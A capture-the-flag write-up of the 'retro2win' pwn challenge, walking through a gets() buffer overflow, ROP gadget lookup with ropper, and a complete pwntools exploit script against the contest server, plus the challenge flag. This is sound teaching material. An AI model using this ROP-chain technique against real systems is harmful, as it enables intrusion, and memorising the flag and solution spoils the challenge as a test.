# Description
So retro.. So winning..

`nc retro2win.ctf.intigriti.io 1338`

# Flag
INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}

# Analysis
From the challenge name you can guess this is probably a ret2win challenge. First things first, check the type of file it is so we know is it 32 or 64 bit. 

![image](https://github.com/user-attachments/assets/9d930155-f3c7-4d6c-9cb7-f3ed45557945)

This binary is a 64 bit. Now we inspect the code, from the code we can see there is a secret feature that isn't displayed when the program is run normally. A player can type in "1337" to enter the cheat code panel where they can submit a cheat code in hopes of accessing the cheat mode. So this must be our goal how can we reach the cheat mode. Inspecting the enter_cheatcode function we can see that it uses gets meaning it is vulnerable to a buffer overflow.

![image](https://github.com/user-attachments/assets/ab2c2634-3d85-4a96-becf-1ea650372359)

To know what you need to search for you need to be aware of the payload format for 64 bit elf files as they are different from the 32 bit files. You can watch this video by CryptoCat to understand more https://youtu.be/vO1Uj2v3r7I?si=OuOVRpZTLXcwDxHs but basically the payload should have this structure:
```
payload = padding + pop_rdi_address + parameter1 + pop_rsi_r15_address + parameter2 + junk(8 bytes of padding) + win_address
```

Now we need to figure out what's the padding so we can begin to prepare our payload. To find the padding we can use gdb, in my case I'm using pwndbg but feel free to use whatever you prefer. First things first, create a cyclic pattern if you don't know how you can do it with the `cyclic 100` or any value command. Next we inject this at the gets. 

![image](https://github.com/user-attachments/assets/0253ec97-ba76-4221-9d61-7c8d11313b5e)

In pwndbg it's alot easier to see the registers which is why I use it as you can see the rsp register has been overflowed.

![image](https://github.com/user-attachments/assets/bbf1ba86-83d9-41ec-bf86-6ce2a82466be)

Now to figure out the padding you can take the first 8 bytes of the overflowed string and use the command `cyclic -l <string>`

![image](https://github.com/user-attachments/assets/9e3d0e85-30de-49ac-a2f3-8285c794174a)

Nice, now we know our padding is 24 bytes, which looks like this in our payload `A * 24` .  Next we need to find our pop rsi and pop rdi addresses, we can use the ropper tool for this. Simply, use the command `ropper --file retro2win --search "pop rsi" and ropper --file retro2win --search "pop rsi"` take the address starting from the 4 the 0's are irrelevant if you are using pwntools for your exploit. 

![image](https://github.com/user-attachments/assets/6fd3502a-c9c3-470f-8c2e-bcdffcbec2e9)

Lastly, we need to find the address of the cheat_mode function. You can do so using gdb or once again the debugger of your choice. Using gdb just use the command `disass <function_name>` . In this case our win address is `0x400736`

![image](https://github.com/user-attachments/assets/1dbb2e96-2a1f-4419-b503-580791ad4b98)

Now that we have all of the information we need we can build our payload.

# Solution
The payload that I used is as below:
```
from pwn import *

# Connect to the remote service
p = remote('retro2win.ctf.intigriti.io', 1338)

# Address of the cheat_mode function (replace with actual address from disassembly)
cheat_mode_address = 0x00400736

# Calculate padding:
# - 16 bytes for the buffer `v1`
# - 8 bytes for the saved return address
# - Additional padding to align the arguments

# The v1 buffer will be filled with 'A's, then we overwrite the return address with cheat_mode address
padding = b"A" * 24  

poprdi = p64(0x4009b3)

poprsi = p64(0x4009b1)

junk = b"B" * 8

# Overwrite return address with the cheat_mode address
address = p64(cheat_mode_address)

# Pass a1 and a2 as arguments to cheat_mode
a1 = p64(0x2323232323232323)
a2 = p64(0x4242424242424242)

payload = padding + poprdi + a1 + poprsi + a2 + junk + address

# Send the exploit
p.recvuntil("Select an option:")
p.sendline("1337")  # Send "1337" to trigger the cheat mode
p.recvuntil("Enter your cheatcode:")  # Wait for prompt
p.sendline(payload)  # Send the crafted payload

# Read and print the output from the server
print(p.recvall())  # Print all the output from the server

# Interact with the process to see any further output (if needed)
p.interactive()

```

Running this gives you the flag :D

![image](https://github.com/user-attachments/assets/f756c6a0-fc47-4fef-8ed7-f1f2ee272f0c)


#L337upCTF2024 #ret2win
